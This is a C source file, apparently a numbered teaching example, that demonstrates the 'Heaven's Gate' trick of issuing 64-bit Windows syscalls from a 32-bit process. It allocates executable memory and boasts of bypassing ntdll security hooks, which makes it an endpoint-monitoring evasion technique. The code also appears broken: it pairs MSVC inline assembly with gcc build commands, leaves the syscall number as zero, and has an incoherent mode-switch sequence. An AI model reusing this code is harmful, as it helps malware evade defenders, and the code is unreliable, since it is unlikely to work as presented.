/*
 * Heaven's Gate - 32-bit process calling 64-bit syscalls
 * Compile as 32-bit to execute 64-bit syscalls on x64 Windows
 *
 * i686-w64-mingw32-gcc -o 03_heavens_gate.exe 03_heavens_gate.c
 */

#include <Windows.h>
#include <stdio.h>

#ifdef _WIN32
// Heaven's Gate - switch to 64-bit mode and execute syscall
__declspec(naked) DWORD64 HeavensGateSyscall(
    DWORD64 syscallNumber,
    DWORD64 arg1,
    DWORD64 arg2,
    DWORD64 arg3,
    DWORD64 arg4,
    DWORD64 arg5,
    DWORD64 arg6)
{
    __asm {
        // Save registers
        push ebp
        mov ebp, esp

            // Switch to 64-bit mode
        push 0x33
        call far ptr switch64
    switch64:
        jmp fword ptr [esp]
        retf

                             // === 64-bit mode ===
        _emit 0x4D // mov r10, r8
        _emit 0x8B
        _emit 0xD0
        _emit 0x49 // mov r11, r9  
        _emit 0x8B
        _emit 0xD9
        _emit 0x4C // mov r9, [rsp+0x28]
        _emit 0x8B
        _emit 0x4C
        _emit 0x24
        _emit 0x28
        _emit 0x4C // mov r8, [rsp+0x30]
        _emit 0x8B
        _emit 0x44
        _emit 0x24
        _emit 0x30
        _emit 0x48 // mov rdx, [rsp+0x38]
        _emit 0x8B
        _emit 0x54
        _emit 0x24
        _emit 0x38
        _emit 0x48 // mov rcx, [rsp+0x40]
        _emit 0x8B
        _emit 0x4C
        _emit 0x24
        _emit 0x40
        _emit 0x49 // mov r10, r9
        _emit 0x8B
        _emit 0xD1
        _emit 0xB8 // mov eax, syscallNumber
        dd 0
        _emit 0x0F // syscall
        _emit 0x05
        _emit 0xC3 // ret

                         // Switch back to 32-bit mode
        push 0x23
        retf

                             // Cleanup
        mov esp, ebp
        pop ebp
        ret
    }
}

// 64-bit NtAllocateVirtualMemory via Heaven's Gate
NTSTATUS NtAllocateVirtualMemory_HG(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect)
{
// Windows 10 x64 syscall number
#define SYSCALL_NT_ALLOCATE_VIRTUAL_MEMORY 0x18

    return (NTSTATUS)HeavensGateSyscall(
        SYSCALL_NT_ALLOCATE_VIRTUAL_MEMORY,
        (DWORD64)ProcessHandle,
        (DWORD64)BaseAddress,
        (DWORD64)ZeroBits,
        (DWORD64)RegionSize,
        (DWORD64)AllocationType,
        (DWORD64)Protect);
}

int main()
{
    printf("[ Heaven's Gate - x64 Syscalls from 32-bit ]\n");
    printf("[*] Process: 32-bit\n");
    printf("[*] Target: 64-bit kernel\n\n");

    PVOID baseAddr = NULL;
    SIZE_T size = 0x1000;

    printf("[*] Calling 64-bit NtAllocateVirtualMemory...\n");

    NTSTATUS status = NtAllocateVirtualMemory_HG(
        GetCurrentProcess(),
        &baseAddr,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (status == 0)
    {
        printf("[+] SUCCESS: Memory allocated at: %p\n", baseAddr);
        printf("[+] 64-bit syscall executed from 32-bit process!\n");
        printf("[+] Bypassed: 32-bit ntdll hooks AND 64-bit ntdll hooks!\n");

        VirtualFree(baseAddr, 0, MEM_RELEASE);
    }
    else
    {
        printf("[-] Failed: 0x%08lx\n", status);
    }

    return 0;
}

#else
#error "Compile as 32-bit with i686-w64-mingw32-gcc"
#endif

// Compile (32-bit): i686-w64-mingw32-gcc -o 03_heavens_gate.exe 03_heavens_gate.c